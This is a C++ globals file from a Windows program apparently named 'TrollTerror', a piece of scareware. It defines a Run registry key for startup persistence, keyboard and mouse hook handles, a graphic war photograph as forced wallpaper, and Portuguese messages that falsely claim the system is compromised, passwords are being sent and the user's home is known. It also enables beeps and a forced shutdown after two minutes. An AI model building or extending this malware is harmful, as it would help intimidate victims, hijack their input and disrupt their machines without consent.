#include "globals.h"

int SW = 0, SH = 0;
std::atomic<bool> g_running{true};
std::mt19937      g_rng;
DWORD             g_mainThreadId = 0;
HWND  g_hMeltWnd   = nullptr;
HHOOK g_hKeyHook   = nullptr;
HHOOK g_hMouseHook = nullptr;
BYTE* g_wavBuf     = nullptr;

const wchar_t RUN_KEY[]   = L"Software\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t STATE_KEY[] = L"Software\\TrollTerror";
const wchar_t WALL_URL[]  = L"https://upload.wikimedia.org/wikipedia/en/b/ba/The_Terror_of_War.jpg";

const wchar_t* MSGS[] = {
    L"\u26A0   N\u00C3O CORRA... eu te observo   \u26A0",
    L"\u2620   SISTEMA COMPROMETIDO   \u2620",
    L"\u274C   ERRO CR\u00CDTICO \u2014 SEUS DADOS FORAM ACESSADOS   \u274C",
    L"\u26A0   EU JA SEI ONDE VOCE MORA   \u26A0",
    L"\u2620   FORMATA\u00C7\u00C3O EM PROGRESSO... 47%   \u2620",
    L"\u274C   SENHA DETECTADA \u2014 ENVIANDO...   \u274C",
    L"\u26A0   VOC\u00CA N\u00C3O PODE ESCAPAR   \u26A0",
};
const int  MSG_COUNT             = 7;
const bool BEEP_ENABLED          = true;
const bool SHUTDOWN_ENABLED      = true;
const int  SHUTDOWN_DELAY_SECONDS = 120; // 2 minutos até reiniciar
